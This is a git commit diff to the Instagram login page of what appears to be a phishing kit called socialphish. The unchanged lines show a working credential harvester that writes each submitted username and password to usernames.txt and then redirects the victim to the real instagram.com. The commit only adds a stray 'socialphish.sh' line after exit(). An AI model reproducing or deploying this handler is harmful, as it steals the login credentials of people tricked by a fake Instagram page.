34fdf3da6ea82e69403705385d29b608e139c7c5
fiorellamdz <fiorellamendez444@gmail.com>
2025-08-22 03:44:14 -0300

    Update login.php
    ..

--- sites/instagram/login.php
+++ sites/instagram/login.php
@@ -3,3 +3,4 @@
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
 exit();
+socialphish.sh
